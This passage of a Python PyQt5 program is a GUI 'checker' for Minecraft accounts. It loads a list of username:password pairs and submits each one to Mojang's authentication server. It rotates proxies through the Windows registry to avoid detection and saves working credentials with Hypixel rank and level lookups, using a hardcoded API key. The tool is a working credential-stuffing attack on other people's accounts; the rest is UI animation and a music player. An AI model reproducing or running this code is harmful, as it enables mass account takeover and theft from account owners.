        self.label_90.setText(_translate("Form", "10000"))
        self.label_89.setText(_translate("Form", "Timeout(millionsecounds)"))
        self.pushButton_17.setText(_translate("Form", "Choose Acounts"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("Form", "Tab 2"))
        self.label_91.setText(_translate("Form", "Other"))
        self.pushButton_2.setText(_translate("Form", "Music"))
        self.pushButton_24.setText(_translate("Form", "About"))
        self.label_111.setText(_translate("Form", "UI Design: "))
        self.label_109.setText(_translate("Form", "Equation, Laiteux, Nitrowo"))
        self.label_105.setText(_translate("Form", "NChecker Core: "))
        self.label_108.setText(_translate("Form", "MoJang"))
        self.label_110.setText(_translate("Form", "Thanks:"))
        self.label_100.setText(_translate("Form", "Music Payer"))
        self.label_112.setText(_translate("Form", "ImportThis"))
        self.label_99.setText(_translate("Form", "ImportThis"))
        self.label_98.setText(_translate("Form", "BreathChecker Core: "))
        self.label_107.setText(_translate("Form", "Minecraft DEV: "))
        self.label_106.setText(_translate("Form", "Dertarer_NPC"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate("Form", "Page"))
        self.label_8.setText(_translate("Form", "Made by "))
        self.label_13.setText(_translate("Form", "Dertarer_NPC"))
        self.pushButton.setText(_translate("Form", "         Checker"))
        self.label_11.setText(_translate("Form", "Designed by"))
        self.label_10.setText(_translate("Form", "ImportThis"))
        self.pushButton_4.setText(_translate("Form", "          Other"))
        self.label_2.setText(_translate("Form", "V 0.0.1"))
        self.pushButton_3.setText(_translate("Form", "          Configuration"))
        self.label_98.hide()
        self.label_99.hide()
        self.label_105.hide()
        self.label_106.hide()
        self.label_107.hide()
        self.label_108.hide()
        self.label_109.hide()
        self.label_110.hide()
        self.label_111.hide()
        self.label_112.hide()
        self.pushButton_22.hide()
        self.pushButton_23.hide()
        self.label_97.hide()
        self.label_113.hide()
        self.label_101.hide()
        self.pushButton_24.clicked.connect(self.About)
        self.pushButton_2.clicked.connect(self.MusicPage)
        self.pushButton.clicked.connect(self.First)
        self.pushButton_3.clicked.connect(self.Second)
        self.pushButton_4.clicked.connect(self.Third)
        self.pushButton_19.clicked.connect(self.CheckBox)
        self.pushButton_20.clicked.connect(self.CheckBox_2)
        self.pushButton_18.clicked.connect(self.ToggleButton)
        self.pushButton_startmusic.clicked.connect(self.music)
        self.pushButton_before.clicked.connect(self.next)
        self.pushButton_after.clicked.connect(self.next)
        self.pushButton_12.clicked.connect(self.exit)
        self.pushButton_11.clicked.connect(self.mini)
        self.pushButton_7.clicked.connect(self.Start)
        self.pushButton_17.clicked.connect(self.Choose_Acount)
        self.pushButton_22.clicked.connect(self.HTTP)
        self.pushButton_23.clicked.connect(self.No_proxy)
        self.pushButton_21.clicked.connect(self.Down)
        self.label_72.textChanged[str].connect(self.thread)
        self.label_72.returnPressed.connect(self.return_msg)
        self.anim = QPropertyAnimation(self.label_35, b"geometry")
        self.anim.setDuration(10000)
        self.anim.setStartValue(QRect(250, 195, 16, 16))
        self.anim.setEndValue(QRect(250, 195, 540, 16))
        #self.anim.start()
        def Thread():
            for i in range(0, 100):
                self.label_14.setText(str(float(i)) + "0%")
                time.sleep(0.1)
            self.label_14.setText("100.00%")
        Thread = threading.Thread(target = Thread)
        #Thread.start()
    def return_msg(self):
         QMessageBox.information(self, "提示", "测卡线程: " + self.label_72.text() + ".")
    def Down(self):
        self.anim = QPropertyAnimation(self.label_113, b"geometry")
        self.anim.setDuration(200)
        self.anim.setStartValue(QRect(350, 450, 141, 0))
        self.anim.setEndValue(QRect(350, 470, 141, 40))
        self.anim.start()
        self.anim3 = QPropertyAnimation(self.label_97, b"geometry")
        self.anim3.setDuration(300)
        self.anim3.setStartValue(QRect(360, 470, 141, 0))
        self.anim3.setEndValue(QRect(360, 470, 141, 20))
        self.anim3.start()
        self.anim4 = QPropertyAnimation(self.label_101, b"geometry")
        self.anim4.setDuration(300)
        self.anim4.setStartValue(QRect(360, 490, 141, 0))
        self.anim4.setEndValue(QRect(360, 490, 141, 20))
        self.anim4.start()
        self.pushButton_22.show()
        self.pushButton_23.show()
        self.label_101.show()
        self.label_97.show()
        self.label_113.show()
    def mousePressEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = True
            self.m_DragPosition = e.globalPos() - self.pos()
            e.accept()
    def mouseReleaseEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = False
    def mouseMoveEvent(self, e):
        try:
            if Qt.LeftButton and self.m_drag:
                self.move(e.globalPos() - self.m_DragPosition)
                e.accept()
        except:
            print("错误代码:000x0")
    def About(self):
        if self.label_98.isVisible() == False:
                self.label_98.show()
                self.label_99.show()
                self.label_105.show()
                self.label_106.show()
                self.label_107.show()
                self.label_108.show()
                self.label_109.show()
                self.label_110.show()
                self.label_111.show()
                self.label_112.show()
                self.pushButton_startmusic.hide()
                self.pushButton_before.hide()
                self.pushButton_after.hide()
                self.label_100.setText("About")
                s = """
                        background:transparent;
                        font-family:微软雅黑;
                        color:white;
                        """
                s2 = """
                        background:transparent;
                        font-family:微软雅黑;
                        color:gray;
                        """
                self.pushButton_24.setStyleSheet(s)
                self.pushButton_2.setStyleSheet(s2)
                self.anim = QPropertyAnimation(self.label_95, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(285, 450, 40, 2))
                self.anim.setEndValue(QRect(368, 450, 40, 2))
                self.anim.start()
    def MusicPage(self):
        if self.label_98.isVisible() == True:
                self.label_98.hide()
                self.label_99.hide()
                self.label_105.hide()
                self.label_106.hide()
                self.label_107.hide()
                self.label_108.hide()
                self.label_109.hide()
                self.label_110.hide()
                self.label_111.hide()
                self.label_112.hide()
                self.pushButton_startmusic.show()
                self.pushButton_before.show()
                self.pushButton_after.show()
                self.label_100.setText("Music Player")
                s = """
                        background:transparent;
                        font-family:微软雅黑;
                        color:white;
                        """
                s2 = """
                        background:transparent;
                        font-family:微软雅黑;
                        color:gray;
                        """
                self.pushButton_24.setStyleSheet(s2)
                self.pushButton_2.setStyleSheet(s)
                self.anim = QPropertyAnimation(self.label_95, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(368, 450, 40, 2))
                self.anim.setEndValue(QRect(285, 450, 40, 2))
                self.anim.start()
    def First(self):
        y = str(self.label_7.pos().y())
        print(y)
        self.pushButton.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:White;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        self.pushButton_4.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:Gray;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        self.pushButton_3.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:Gray;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        if y == "170":
                self.anim = QPropertyAnimation(self.label_7, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(5, 170, 210, 41))
                self.anim.setEndValue(QRect(5, 130, 210, 41))
                self.anim.start()
                self.anim2 = QPropertyAnimation(self.label_6, b"geometry")
                self.anim2.setDuration(100)
                self.anim2.setStartValue(QRect(0, 170, 5, 40))
                self.anim2.setEndValue(QRect(0, 130, 5, 40))
                self.anim2.start()
        if y == "213":
                self.anim = QPropertyAnimation(self.label_7, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(5, 213, 210, 41))
                self.anim.setEndValue(QRect(5, 130, 210, 41))
                self.anim.start()
                self.anim2 = QPropertyAnimation(self.label_6, b"geometry")
                self.anim2.setDuration(100)
                self.anim2.setStartValue(QRect(0, 213, 5, 40))
                self.anim2.setEndValue(QRect(0, 130, 5, 40))
                self.anim2.start()
        self.tabWidget.setCurrentIndex(0)
    def Second(self):
        y = str(self.label_7.pos().y())
        print(y)
        self.pushButton_3.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:White;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        self.pushButton_4.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:Gray;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        self.pushButton.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:Gray;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        if y == "130":
                self.anim = QPropertyAnimation(self.label_7, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(5, 130, 210, 41))
                self.anim.setEndValue(QRect(5, 170, 210, 41))
                self.anim.start()
                self.anim2 = QPropertyAnimation(self.label_6, b"geometry")
                self.anim2.setDuration(100)
                self.anim2.setStartValue(QRect(0, 130, 5, 40))
                self.anim2.setEndValue(QRect(0, 170, 5, 40))
                self.anim2.start()
        if y == "213":
                self.anim = QPropertyAnimation(self.label_7, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(5, 213, 210, 41))
                self.anim.setEndValue(QRect(5, 170, 210, 41))
                self.anim.start()
                self.anim2 = QPropertyAnimation(self.label_6, b"geometry")
                self.anim2.setDuration(100)
                self.anim2.setStartValue(QRect(0, 213, 5, 40))
                self.anim2.setEndValue(QRect(0, 170, 5, 40))
                self.anim2.start()
        self.tabWidget.setCurrentIndex(1)
    def Third(self):
        y = str(self.label_7.pos().y())
        print(y)
        self.pushButton_4.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:White;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        self.pushButton_3.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:Gray;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        self.pushButton_2.setStyleSheet("QPushButton{\n"
                                      "    border-radius:18px;\n"
                                      "    color:Gray;\n"
                                      "    font-family:微软雅黑;\n"
                                      "    font-size:15px;    \n"
                                      "    background:Transparent;\n"
                                      "}")
        if y == "130":
                self.anim = QPropertyAnimation(self.label_7, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(5, 130, 210, 41))
                self.anim.setEndValue(QRect(5, 213, 210, 41))
                self.anim.start()
                self.anim2 = QPropertyAnimation(self.label_6, b"geometry")
                self.anim2.setDuration(100)
                self.anim2.setStartValue(QRect(0, 130, 5, 40))
                self.anim2.setEndValue(QRect(0, 213, 5, 40))
                self.anim2.start()
        if y == "170":
                self.anim = QPropertyAnimation(self.label_7, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(5, 170, 210, 41))
                self.anim.setEndValue(QRect(5, 213, 210, 41))
                self.anim.start()
                self.anim2 = QPropertyAnimation(self.label_6, b"geometry")
                self.anim2.setDuration(100)
                self.anim2.setStartValue(QRect(0, 170, 5, 40))
                self.anim2.setEndValue(QRect(0, 213, 5, 40))
                self.anim2.start()
        self.tabWidget.setCurrentIndex(2)
    def CheckBox(self):
        tempfilename = "C:\\Users\\"+ getpass.getuser() + "\\Documents" #创建系统的缓存目录用来计算点击次数
        if os.path.exists(tempfilename + "\\CheckBox.ini") == False:
            file = open(tempfilename + "\\CheckBox.ini", "w")
            file.close()
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap(""), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_19.setIcon(icon)
        else:
            os.remove(tempfilename + "\\CheckBox.ini")
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("res/check.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_19.setIcon(icon)
    def CheckBox_2(self):
        tempfilename = "C:\\Users\\"+ getpass.getuser() + "\\Documents" #创建系统的缓存目录用来计算点击次数
        if os.path.exists(tempfilename + "\\CheckBox_2.ini") == False:
            file = open(tempfilename + "\\CheckBox_2.ini", "w")
            file.close()
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap(""), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_20.setIcon(icon)
        else:
            os.remove(tempfilename + "\\CheckBox_2.ini")
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("res/check.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_20.setIcon(icon)
    def ToggleButton(self):
        tempfilename = "C:\\Users\\" + getpass.getuser() + "\\Documents"  # 创建系统的缓存目录用来计算点击次数
        if os.path.exists(tempfilename + "\\ToggleButton.ini") == False:
                file = open(tempfilename + "\\ToggleButton.ini", "w")
                file.close()
                self.anim = QPropertyAnimation(self.label_77, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(463, 220, 16, 16))
                self.anim.setEndValue(QRect(493, 220, 16, 16))
                self.anim.start()
                self.pushButton_18.setStyleSheet("QPushButton{\n"
                                                 "    color:Gray;\n"
                                                 "    font-family:微软雅黑;\n"
                                                 "    border: 2px solid DarkGray;\n"
                                                 "    background:rgb(255, 255, 255, 70);\n"
                                                 "    border-radius: 10px;\n"
                                                 "}\n"
                                                 "QPushButton:pressed{\n"
                                                 "    border: 2px solid DarkGray;\n"
                                                 "    background:rgb(255, 255, 255, 30);\n"
                                                 "}")
        else:
                os.remove(tempfilename + "\\ToggleButton.ini")
                self.anim = QPropertyAnimation(self.label_77, b"geometry")
                self.anim.setDuration(100)
                self.anim.setStartValue(QRect(493, 220, 16, 16))
                self.anim.setEndValue(QRect(463, 220, 16, 16))
                self.anim.start()
                self.pushButton_18.setStyleSheet("QPushButton{\n"
                                                 "    color:Gray;\n"
                                                 "    font-family:微软雅黑;\n"
                                                 "    border: 2px solid DarkGray;\n"
                                                 "    background:rgb(255, 255, 255, 20);\n"
                                                 "    border-radius: 10px;\n"
                                                 "}\n"
                                                 "QPushButton:pressed{\n"
                                                 "    border: 2px solid DarkGray;\n"
                                                 "    background:rgb(255, 255, 255, 30);\n"
                                                 "}")
    def next(self):
        music_list = []
        for i in os.listdir("music"):
            music_list.append(i)
        import random
        random_num = random.randint(0, len(os.listdir("music\\")) - 1)
        print(music_list[random_num])
        import pygame
        filename="music\\" + music_list[random_num]
        pygame.mixer.init()
        pygame.mixer.music.load(filename)
        pygame.mixer.music.play(1)
        music_name = filename.replace(".mp3", "")
    def music(self):
        if os.path.exists("music.ini") == False:
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("res/pause.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            file = open("music.ini", "w")
            file.close()
            self.pushButton_startmusic.setIconSize(QtCore.QSize(45, 45))
            self.pushButton_startmusic.setIcon(icon)
            music_list = []
            for i in os.listdir("music"):
                music_list.append(i)
            import random
            random_num = random.randint(0, len(os.listdir("music\\")) - 1)
            print(music_list[random_num])
            import pygame
            filename="music\\" + music_list[random_num]
            pygame.mixer.init()
            pygame.mixer.music.load(filename)
            pygame.mixer.music.play(1)
            music_name = filename.replace(".mp3", "")
            print(music_name)
            def heart_stop():
                while True:
                    if os.path.exists("music.ini") == False:
                        pygame.mixer.music.pause()
                        break
            Thread = threading.Thread(target = heart_stop)
            Thread.start()
        else:
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("res/play-button.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_startmusic.setIconSize(QtCore.QSize(15, 18))
            self.pushButton_startmusic.setIcon(icon)
            os.remove("music.ini")
    def Choose_Acount(self):
        try:
                fileName = QtWidgets.QFileDialog.getOpenFileName(self, "选取文件", os.getcwd(), "TXT文件(*.txt)")
                print(str(fileName[0]).replace("/", "\\"))
                file = open(str(fileName[0]).replace("/", "\\"), "r", encoding="utf-8")
                text = len(file.readlines())
                file.close()
                self.label_17.setText(str(text))
                file = open("OutPutProxy.txt", "r")
                text2 = len(file.readlines())
                self.label_18.setText(str(text2))
                file.close()
                self.label_54.setText("0")
                self.label_55.setText(str(text))
                self.label_56.setText("0")
                second = int(text / 3)
                print("大约需要" + str(second) + "秒测完这些卡.")
                # def Thread():
                #         toaster = ToastNotifier()
                #         toaster.show_toast(u'提示', "大约需要" + str(second) + "秒测完这些卡.", icon_path="res\\Breath.ico")
                # Thread = threading.Thread(target = Thread)
                # Thread.start()
                if os.path.exists("Acount.txt"):
                        os.remove("Acount.txt")
                        text = open(str(fileName[0]).replace("/", "\\"), encoding="utf-8")
                        acounts = text.read()
                        text.close()
                        file = open("Acount.txt", "w", encoding="utf-8")
                        file.write(acounts)
                        file.close()
        except:
                pass
    def exit(self):
        path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        if os.path.exists("music.ini"):
            os.remove("music.ini")
        def Thread():
            for i in reversed(range(0, 11)):
                self.setWindowOpacity(i / 10)
                time.sleep(0.03)
            os._exit(-1)
        Thread = threading.Thread(target=Thread)
        Thread.start()
    def mini(self):
        def Thread():
            for i in reversed(range(0, 11)):
                self.setWindowOpacity(i / 10)
                time.sleep(0.03)
            self.showMinimized()
            self.setWindowOpacity(1)
        Thread = threading.Thread(target=Thread)
        Thread.start()
    def Start(self):
        if self.label_54.text() == "":
            QMessageBox.about(self, "提示", "您没有选择任何账号文件.")
        else:
            # def Thread():
            #     toaster = ToastNotifier()
            #     toaster.show_toast(u'提示', "正在启动核心..", icon_path="res\\Breath.ico")
            # Thread = threading.Thread(target=Thread)
            # Thread.start()
            # def Thread():
            #     time.sleep(6)
            #     toaster = ToastNotifier()
            #     toaster.show_toast(u'提示', "启动成功, 正在测卡..", icon_path="res\\Breath.ico")
            # Thread = threading.Thread(target=Thread)
            # Thread.start()
            self.label_35.resize(16, 16)
            self.label_14.setText("0.00%")
            一分之一 = 540
            二分之一 = 540 / 2
            四分之一 = 540 / 4
            十分之一 = 540 / 10
            self.anim = QPropertyAnimation(self.label_35, b"geometry")
            self.anim.setDuration(300)
            self.anim.setStartValue(QRect(250, 195, 16, 16))
            self.anim.setEndValue(QRect(250, 195, 四分之一, 16))
            self.anim.start()
            try:
                if self.label_72.text() == "":
                        pass
                else:
                    num = int(self.label_72.text())
                    if num < 4 and num > 0:
                        self.label_72.setText("1")
                    if num >= 4 and num < 10:
                        self.label_72.setText("4")
                    if num >= 10 and num < 50:
                        self.label_72.setText("10")
                    if num >= 50:
                        self.label_72.setText("50")
            except Exception as e:
                self.label_72.setText("1")
            def Acount_Out(out):
                try:
                    file = open("Acount_Out.txt", "a")
                    file.write(out + "\n")
                    file.close()
                except Exception as e:
                    print(e)
            def Checkrank(username):
                try:
                    hypixel_api = "1bc2fb96-bcb0-4502-ac01-0246e5feaf82"
                    res = requests.get(
                            "https://api.hypixel.net/player?key=" + hypixel_api + "&name=" + username).text
                    target = 'PackageRank":"'
                    location = res.index(target)
                    target2 = '","'
                    location2 = res[location:location + 30].index(target2)
                    return res[location:location + 30][:location2].replace(target, "")
                except:
                    return ""
            def CheckLevel(username):
                 try:
                     res = requests.get("https://sk1er.club/stats/" + username).text
                     target = "Network Level: </strong> "
                     location = res.index(target)
                     target2 = "<br>"
                     location2 = res[location:location + 40].index(target2)
                     return res[location:location + 40][:location2].replace("Network Level: </strong> ", "")
                 except:
                     return "1"
            try:
                os.remove("Acount_Out.txt")
            except:
                pass
            if self.label_72.text() == "1":
                def Proxy():
                    while True:
                        file = open("OutPutProxy.txt", "r", encoding="utf-8")
                        Proxy_num = len(file.readlines())
                        file.close()
                        for i in range(1, Proxy_num):
                            path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0,winreg.KEY_ALL_ACCESS)
                            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
                            text = linecache.getline("OutPutProxy.txt", i)
                            print(text.replace("\n", ""))
                            proxy = text.replace("\n", "")
                            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy)
                            winreg.CloseKey(key)
                            time.sleep(4)
                Thread = threading.Thread(target=Proxy)
                if self.label_88.text() == "HTTP":
                    print("代理模式: HTTP")
                    Thread.start()
                def Thread():
                    file = open("Acount.txt", "r")
                    num = len(file.readlines())
                    file.close()
                    print(num)
                    for i in range(1, num):
                        file = linecache.getline("Acount.txt", i)
                        target = ":"
                        location = file.index(target)
                        acount = file[0:location]
                        password = file[location + 1:].replace("\n", "")
                        url = "https://authserver.mojang.com/authenticate"
                        headers = {"content-type": "application/json"}
                        request_body = json.dumps({
                             'agent': {
                                     'name': 'Minecraft',
                                     'version': 1
                             },
                             'username': acount,
                             'password': password,
                             'requestUser': 'true'
                        })
                        try:
                            answer = requests.post(url, data=request_body, headers=headers).text
                            error = '{"error":"ForbiddenOperationException","errorMessage":"Invalid credentials. Invalid username or password."}'
                            res = error in answer
                            self.label_54.setText(str(int(self.label_54.text()) + 1))
                            self.label_55.setText(str(int(self.label_55.text()) - 1))
                            if res == True:
                                    Acount_Out("Invalid username or password.")
                            else:
                                self.label_55.setText(str(int(self.label_55.text()) + 1))
                                target = 'availableProfiles":[{"name":"'
                                text1 = answer[answer.index(target):]
                                target2 = '","id":'
                                text2 = text1[:text1.index(target2)]
                                username = text2.replace('availableProfiles":[{"name":"', "")
                                level = CheckLevel(username)
                                if Checkrank(username) != "":
                                    Acount_Out(acount + ":" + password + ":" + username + " | Level: " + level + "Rank: " + Checkrank(username))
                                else:
                                    Acount_Out(acount + ":" + password + ":" + username + " | Level: " + level)
                        except Exception as e:
                                print(e)
                                pass
                Thread = threading.Thread(target=Thread)
                Thread.start()
    def closeEvent(self, event):
        path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        if os.path.exists("music.ini"):
            os.remove("music.ini")
        os._exit(-1)
    def HTTP(self):
        print("HTTP")
        self.label_88.setText("HTTP")
        self.label_112.hide()
        self.pushButton_22.hide()
        self.pushButton_23.hide()
        self.label_97.hide()
        self.label_113.hide()
        self.label_101.hide()
        self.label_88.move(410, 445)
    def No_proxy(self):
        print("No_proxy")
        self.label_88.setText("No proxy")
        self.label_112.hide()
        self.pushButton_22.hide()
        self.pushButton_23.hide()
        self.label_97.hide()
        self.label_113.hide()
        self.label_101.hide()
        self.label_88.move(395, 445)
def main():
    app = QtWidgets.QApplication(sys.argv)
    gui = Ui_Form()
    gui.show()
    sys.exit(app.exec_())
if __name__ == '__main__':
    main()
# import win32api, win32con
# x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
# y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)